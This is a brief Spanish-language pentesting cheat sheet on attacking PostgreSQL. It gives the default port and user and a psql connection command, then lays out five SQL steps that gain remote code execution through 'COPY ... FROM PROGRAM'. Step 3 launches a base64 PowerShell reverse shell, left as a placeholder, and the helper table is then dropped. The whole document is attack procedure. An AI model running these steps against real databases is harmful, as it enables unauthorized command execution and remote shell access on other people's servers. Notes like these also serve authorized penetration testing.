# Info

- Suele estar en el puerto 5432
- El usuario por default es postgres

# Conectarse

    psql -h <ip> -U <user>

# RCE

#### 1)
    DROP TABLE IF EXISTS cmd_exec;

#### 2)
    CREATE TABLE cmd_exec(cmd_output text);

#### 3) 

    COPY cmd_exec FROM PROGRAM '<reverse_shell_power_b64>';

#### 4)

    SELECT * FROM cmd_exec;
#### 5)

    DROP TABLE IF EXISTS cmd_exec;
